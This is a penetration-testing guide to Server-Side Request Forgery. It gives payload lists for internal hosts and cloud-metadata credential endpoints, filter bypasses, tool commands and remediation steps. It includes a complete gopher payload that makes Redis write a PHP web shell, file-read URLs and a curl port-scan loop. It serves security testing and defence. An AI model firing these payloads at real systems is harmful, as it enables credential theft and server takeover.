# Server-Side Request Forgery (SSRF) Testing

## Overview
SSRF allows attackers to make the server-side application send HTTP requests to an arbitrary domain or internal resource. This can be used to access internal services, cloud metadata, or pivot into internal networks.

## Classification
- **CWE:** CWE-918 (Server-Side Request Forgery)
- **OWASP:** A10:2021 - Server-Side Request Forgery
- **CVSS Base:** 5.3 - 9.8 (Critical when cloud metadata accessible)

## Detection Methodology

### 1. Identify SSRF-Prone Functionality
- URL fetchers (link previews, URL validators)
- PDF generators (HTML-to-PDF)
- Image processors (resize, thumbnail)
- Webhook configurations
- File imports from URL
- API integrations (proxy, gateway)
- RSS/Atom feed readers
- OAuth callback URLs
- Map tile fetchers
- Document converters

### 2. Basic SSRF Payloads

**Internal network scanning:**
```
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
```

**Cloud metadata endpoints:**
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token

# DigitalOcean
http://169.254.169.254/metadata/v1/

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
```

**Internal services:**
```
http://localhost:6379/         # Redis
http://localhost:11211/        # Memcached
http://localhost:27017/        # MongoDB
http://localhost:9200/         # Elasticsearch
http://localhost:5601/         # Kibana
http://localhost:8500/         # Consul
http://localhost:2379/         # etcd
http://localhost:15672/        # RabbitMQ Management
http://localhost:9090/         # Prometheus
http://localhost:3000/         # Grafana
```

### 3. Protocol Exploitation
```
file:///etc/passwd                    # Local file read
dict://localhost:6379/INFO            # Redis
gopher://localhost:6379/_*1%0d%0a...  # Redis command execution
ftp://internal-ftp:21/               # FTP
ldap://localhost:389/                 # LDAP
```

### 4. Gopher Protocol (Advanced SSRF)

**Redis command execution:**
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A
```

**MySQL query:**
```
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01...
```

### 5. Filter Bypass Techniques

**IP address encoding:**
```
http://0x7f000001/          # Hex
http://2130706433/           # Decimal
http://0177.0.0.1/           # Octal
http://127.1/                # Short form
http://127.0.0.1.nip.io/    # DNS rebinding service
http://[::ffff:127.0.0.1]/  # IPv6 mapped
http://①②⑦.⓪.⓪.①/         # Unicode numbers
```

**URL parsing inconsistencies:**
```
http://evil.com@127.0.0.1/
http://127.0.0.1#@evil.com/
http://127.0.0.1%00@evil.com/
http://evil.com\@127.0.0.1/
```

**Redirect-based bypass:**
```
# If only domain is validated, use redirect:
http://allowed-domain.com/redirect?url=http://169.254.169.254/
```

**DNS rebinding:**
```
1. Register domain that alternates between attacker IP and internal IP
2. First DNS resolution → passes validation (attacker IP)
3. Second DNS resolution → hits internal target (127.0.0.1)
```

**Protocol smuggling:**
```
http://127.0.0.1:6379/%0D%0AINFO%0D%0A    # CRLF to Redis
```

## Blind SSRF Detection

### Using Out-of-Band
```
# Burp Collaborator / interact.sh
http://your-collaborator-id.burpcollaborator.net

# interactsh
http://your-id.interactsh.com

# Check for DNS/HTTP callback
```

### Time-Based
```
# Accessible internal host → fast response
# Inaccessible host → timeout (slow response)
# Compare response times for different IPs
```

## Tool Usage
```bash
# SSRFmap
ssrfmap -r request.txt -p url -m readfiles
ssrfmap -r request.txt -p url -m portscan

# Nuclei SSRF templates
nuclei -u http://target.com -t ssrf/ -batch

# Gopherus (generate Gopher payloads)
gopherus --exploit redis
gopherus --exploit mysql
gopherus --exploit fastcgi

# Manual internal port scan via SSRF
for port in 80 443 8080 8443 6379 27017 3306 5432 9200; do
  curl "http://target.com/fetch?url=http://127.0.0.1:$port"
done
```

## Remediation
1. **URL validation** — whitelist allowed domains/IPs
2. **Block private IP ranges** — reject 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16
3. **Disable unnecessary protocols** — block file://, gopher://, dict://
4. **Use allowlist** — only permit specific external domains
5. **Network segmentation** — isolate application from sensitive internal services
6. **IMDSv2** — require token-based metadata access (AWS)
7. **DNS resolution validation** — resolve and validate IP before request

## Evidence Collection
- SSRF payload and response
- Internal services/ports discovered
- Cloud metadata extracted (sanitize credentials)
- Network topology mapped
- Impact assessment
